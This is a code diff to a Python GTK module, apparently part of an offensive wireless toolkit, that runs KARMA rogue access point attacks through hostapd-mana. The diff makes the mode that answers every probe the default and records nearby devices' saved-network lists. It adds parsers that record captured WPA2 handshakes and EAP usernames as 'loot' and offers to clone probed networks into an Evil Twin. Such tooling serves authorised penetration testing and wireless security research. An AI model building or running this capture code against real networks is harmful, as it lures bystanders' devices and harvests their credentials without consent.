@@ -88,14 +88,39 @@ _NOISE_SSIDS = {
 }
 
 
-# hostapd-mana lines. Version-independent regexes; hostapd-mana
-# 2.6 and 2.12 print slightly different phrasing.
-_PROBE_RE = re.compile(
+# hostapd-mana output parsers. The exact phrasing varies between
+# mana-2.6 (based on hostapd 2.6) and mana-2.12 (hostapd 2.10+)
+# so we use broad regexes that match both.
+#
+# Directed probe request (client probing a specific SSID):
+#   "MANA - Directed probe request for SSID 'X' from aa:bb:cc"
+_DIRECTED_PROBE_RE = re.compile(
+    r"MANA.*Directed probe request.*SSID[: ]+['\"]?([^'\"\\r\\n]+?)['\"]?.*from\s+([0-9a-f:]{17})",
+    re.IGNORECASE)
+# Broadcast probe request (client probing with wildcard/empty SSID):
+#   "MANA - Broadcast probe request from aa:bb:cc"
+_BROADCAST_PROBE_RE = re.compile(
+    r"MANA.*Broadcast probe request.*from\s+([0-9a-f:]{17})",
+    re.IGNORECASE)
+# Fallback: older format "probe request from MAC for SSID X"
+_PROBE_RE_LEGACY = re.compile(
     r"probe request.*?from\s+([0-9a-f:]{17}).*?"
     r"(?:for(?: SSID)?|SSID:|SSID=)\s*['\"]?([^'\"\r\n]+?)['\"]?\s*$",
     re.IGNORECASE)
+# Client associated:
+#   "wlan1: AP-STA-CONNECTED aa:bb:cc"
 _ASSOC_RE = re.compile(
     r"(?:AP-STA-CONNECTED|associated.*?from)\s+([0-9a-f:]{17})",
+    re.IGNORECASE)
+# WPA2 half-handshake captured:
+#   "MANA: Captured a WPA/2 handshake from: aa:bb:cc"
+_HANDSHAKE_RE = re.compile(
+    r"MANA.*Captured.*WPA.*handshake.*from[: ]+([0-9a-f:]{17})",
+    re.IGNORECASE)
+# EAP credential captured:
+#   "MANA EAP EAP-MSCHAPV2 ASLEAP user=X ..."
+_EAP_CRED_RE = re.compile(
+    r"MANA EAP.*user=([^\s]+)",
     re.IGNORECASE)
 
 
@@ -206,12 +231,28 @@ class Karma(NHModule):
                         "still work against modern phones.")
         self.mode = Adw.ComboRow(title="Mode")
         self.mode.set_model(Gtk.StringList.new([
-            "Selective (allowlist, quiet)",
-            "Loud (respond to every probe)",
-            "Targeted-MAC (allowlist + MAC filter)",
-            "Beacon-only (broadcast the allowlist as beacons)",
+            "Loud — respond to ALL probes + rebroadcast (needed for modern devices)",
+            "Selective — allowlist only, quiet (per-device, no rebroadcast)",
+            "Targeted-MAC — allowlist + MAC filter",
+            "Beacon-only — broadcast allowlist as beacons (for iOS/Android with no directed probes)",
         ]))
+        # Loud is the default because modern devices (iOS 8+, Android 6+,
+        # Windows 10+) emit very few directed probes. They auto-connect
+        # only when they *see* a beacon for a saved Open network, which
+        # requires mana_loud=1.
+        self.mode.set_selected(0)
         mode_group.add(self.mode)
+
+        # Explainer row so the operator understands the difference.
+        explain = Adw.ActionRow(
+            title="How KARMA works",
+            subtitle="Devices emit Probe Requests advertising their "
+                     "saved networks (PNL). KARMA responds with a "
+                     "Probe Response using the same SSID, then accepts "
+                     "any Auth/Assoc. Loud mode also rebroadcasts all "
+                     "seen SSIDs as beacons — required for iOS 8+ and "
+                     "Android 6+ which rarely emit directed probes.")
+        mode_group.add(explain)
 
         self.ssid_allowlist = Adw.EntryRow(
             title="SSID allowlist (comma-separated)")
@@ -426,15 +467,21 @@ class Karma(NHModule):
                 "private_key=/etc/hostapd-mana/certs/server.key\n")
 
         # Mode-specific mana lines.
+        # Combo order: 0=Loud, 1=Selective, 2=Targeted-MAC, 3=Beacon-only
         mode_idx = self.mode.get_selected()
-        mode_names = ["selective", "loud",
-                      "targeted_mac", "beacon_only"]
+        mode_names = ["loud", "selective", "targeted_mac", "beacon_only"]
         mode_name = mode_names[mode_idx]
 
-        mana_parts = ["mana_macacl=0"]
-        if mode_idx == 1:  # loud
+        # Always log probes to a file so we can parse the PNL after the
+        # session. The mana_outfile format is: MAC, SSID, random?, taxonomy.
+        probe_log = loot_path("karma", "karma-probes-%s.csv" % stamp)
+
+        mana_parts = ["mana_macacl=0",
+                      "mana_outfile=" + probe_log]
+        if mode_idx == 0:  # Loud
             mana_parts.append("mana_loud=1")
         else:
+            # Selective / Targeted-MAC: quiet, per-device
             mana_parts.append("mana_loud=0")
             if allow_ssids:
                 filt = "/tmp/nhp-karma-ssidfilter.txt"
@@ -442,6 +489,7 @@ class Karma(NHModule):
                 mana_parts.append(
                     "mana_ssidfilter_file=%s" % filt)
             if mode_idx == 2 and allow_macs:
+                # Targeted-MAC: extend ACL to probe responses
                 mfilt = "/tmp/nhp-karma-macallow.txt"
                 self._write_file(mfilt, "\n".join(allow_macs) + "\n")
                 mana_parts += [
@@ -549,19 +597,50 @@ class Karma(NHModule):
     # ------------------------------------------------------ parsers
     def _parse_stream(self, text: str) -> None:
         for line in (text or "").splitlines():
-            m = _PROBE_RE.search(line)
+            # Directed probe (MANA log: "Directed probe request for SSID X from MAC")
+            m = _DIRECTED_PROBE_RE.search(line)
             if m:
-                mac = m.group(1).lower()
-                ssid_v = m.group(2)[:32]
-                if ssid_v and ssid_v != "\\x00":
+                ssid_v = m.group(1).strip()[:32]
+                mac = m.group(2).lower()
+                if ssid_v and ssid_v not in ("\\x00", ""):
                     d = self._probes.setdefault(
                         ssid_v, {"count": 0, "clients": set(),
-                                 "last_seen": time.time()})
+                                 "last_seen": time.time(),
+                                 "type": "directed"})
                     d["count"] += 1
                     d["clients"].add(mac)
                     d["last_seen"] = time.time()
                     self._client_macs.add(mac)
                 continue
+            # Broadcast probe (wildcard / empty SSID)
+            b = _BROADCAST_PROBE_RE.search(line)
+            if b:
+                mac = b.group(1).lower()
+                self._client_macs.add(mac)
+                d = self._probes.setdefault(
+                    "<broadcast>", {"count": 0, "clients": set(),
+                                    "last_seen": time.time(),
+                                    "type": "broadcast"})
+                d["count"] += 1
+                d["clients"].add(mac)
+                d["last_seen"] = time.time()
+                continue
+            # Legacy probe format fallback
+            ml = _PROBE_RE_LEGACY.search(line)
+            if ml:
+                mac = ml.group(1).lower()
+                ssid_v = ml.group(2)[:32]
+                if ssid_v and ssid_v != "\\x00":
+                    d = self._probes.setdefault(
+                        ssid_v, {"count": 0, "clients": set(),
+                                 "last_seen": time.time(),
+                                 "type": "directed"})
+                    d["count"] += 1
+                    d["clients"].add(mac)
+                    d["last_seen"] = time.time()
+                    self._client_macs.add(mac)
+                continue
+            # Client associated
             a = _ASSOC_RE.search(line)
             if a:
                 mac = a.group(1).lower()
@@ -570,6 +649,28 @@ class Karma(NHModule):
                 if not self._first_client_seen:
                     self._first_client_seen = True
                     self._fire_hooks(mac)
+                continue
+            # WPA2 half-handshake captured
+            h = _HANDSHAKE_RE.search(line)
+            if h:
+                mac = h.group(1).lower()
+                self.output.append(
+                    "[WPA2 handshake captured from %s]\n" % mac)
+                if self._loot_id is not None:
+                    get_loot_store().append_notes(
+                        self._loot_id,
+                        "WPA2 handshake from " + mac)
+                continue
+            # EAP credential captured
+            e = _EAP_CRED_RE.search(line)
+            if e:
+                user = e.group(1)
+                self.output.append(
+                    "[EAP credential captured: %s]\n" % user)
+                if self._loot_id is not None:
+                    get_loot_store().append_notes(
+                        self._loot_id,
+                        "EAP cred: " + user)
 
     def _refresh_ui(self) -> bool:
         if self._proc is None or not self._proc.running:
@@ -661,10 +762,14 @@ class Karma(NHModule):
         top = sorted(self._probes.items(),
                      key=lambda kv: kv[1]["count"], reverse=True)[:30]
         for ssid, info in top:
+            probe_type = info.get("type", "directed")
+            type_badge = "📡 directed" if probe_type == "directed" \
+                          else "📻 broadcast"
             row = Adw.ActionRow(
                 title=ssid,
-                subtitle="%d probes · %d client(s)"
-                        % (info["count"], len(info["clients"])))
+                subtitle="%s · %d probes · %d client(s)"
+                        % (type_badge, info["count"],
+                           len(info["clients"])))
             btn = Gtk.Button(label="Clone in Evil Twin",
                              valign=Gtk.Align.CENTER)
             btn.connect(
